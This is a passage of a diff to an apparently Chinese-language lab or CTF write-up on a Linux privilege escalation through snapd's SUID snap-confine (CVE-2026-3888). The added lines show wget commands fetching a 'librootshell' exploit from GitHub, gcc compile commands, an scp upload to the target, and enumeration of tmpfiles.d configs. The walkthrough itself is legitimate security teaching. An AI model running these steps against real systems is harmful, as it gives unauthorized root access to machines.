@@ -339,7 +339,42 @@ drwxr-x--- 15 jonathan jonathan 4096 Mar 20 12:28 ..
 drwxr-xr-x  4 jonathan jonathan 4096 Mar 20 11:38 snapd-desktop-integration
 
 ```
-#### 我们在谷歌上搜索了有关最新 snapd 漏洞的信息，发现 Quayls 发布了这样的声明：所有版本（包括 2.74.2 之前的所有版本）都存在针对默认 Ubuntu 图形用户界面安装的攻击漏洞。目标所使用的 Ubuntu 24.04 系统中，snap-confine 是一个 SUID-root 二进制文件，它会在任何 snap 运行之前构建沙盒环境。而在 Ubuntu 25.10 及更高版本中，snap-confine 则具有相应的权限。这种设置的一部分内容包括创建模拟文件，即可写入的只读文件系统目录的副本。对于 /usr/lib/x86_64-linux-gnu 目录的模拟序列是：
+#### 我们在谷歌上搜索了有关最新 snapd 漏洞的信息，发现 Quayls 发布了这样的声明：所有版本（包括 2.74.2 之前的所有版本）都存在针对默认 Ubuntu 图形用户界面安装的攻击漏洞。目标所使用的 Ubuntu 24.04 系统中，snap-confine 是一个 SUID-root 二进制文件，它会在任何 snap 运行之前构建沙盒环境。而在 Ubuntu 25.10 及更高版本中，snap-confine 则具有相应的权限。这种设置的一部分内容包括创建模拟文件，即可写入的只读文件系统目录的副本。
+-----------------------------------------------------------------------------------------
+```
+[★]$ wget https://raw.githubusercontent.com/nomaisthere/CVE-2026-3888/refs/heads/main/src/firefox_2404.c
+[★]$ wget https://raw.githubusercontent.com/nomaisthere/CVE-2026-3888/refs/heads/main/src/librootshell.c
+[★]$ gcc -O2 -static -o firefox_2404 firefox_2404.c
+[★]$ gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell.c
+[★]$ scp firefox_2404  librootshell.so jonathan@10.129.20.138:/home/jonathan
+jonathan@10.129.20.138's password: 
+firefox_2404                                  100%  768KB 301.7KB/s   00:02    
+librootshell.so                               100% 9056    37.9KB/s   00:00   
+```
+```
+jonathan@snapped:~$ ls -la /usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root root 159016 Aug 20  2024 /usr/lib/snapd/snap-confine
+jonathan@snapped:~$ cat /usr/lib/tmpfiles.d/tmp.conf
+#  This file is part of systemd.
+#
+#  systemd is free software; you can redistribute it and/or modify it
+#  under the terms of the GNU Lesser General Public License as published by
+#  the Free Software Foundation; either version 2.1 of the License, or
+#  (at your option) any later version.
+
+# See tmpfiles.d(5) for details
+
+# Clear tmp directories separately, to make them easier to override
+D /tmp 1777 root root 4m
+#q /var/tmp 1777 root root 30d
+jonathan@snapped:~$ cat /usr/lib/tmpfiles.d/snapd.conf
+D! /tmp/snap-private-tmp 0700 root root -
+```
+#### 这个内部的 /tmp 目录就是作为 snap 沙盒内的 /tmp 目录进行绑定挂载的。当您在 firefox snap 内运行并执行 ls /tmp 命令时，实际上查看的是主机上的 /tmp/snap-private-tmp/snap.firefox/tmp/ 目录。
+
+-----------------------------------------------------------------------------------------
+### 官方的方式行不通 firefox.c的代码不对劲
+#### 对于 /usr/lib/x86_64-linux-gnu 目录的模拟序列是：
 ```
 1. mount --bind /usr/lib/x86_64-linux-gnu → /tmp/.snap/usr/lib/x86_64-linux-gnu
 2. mount -t tmpfs → /usr/lib/x86_64-linux-gnu
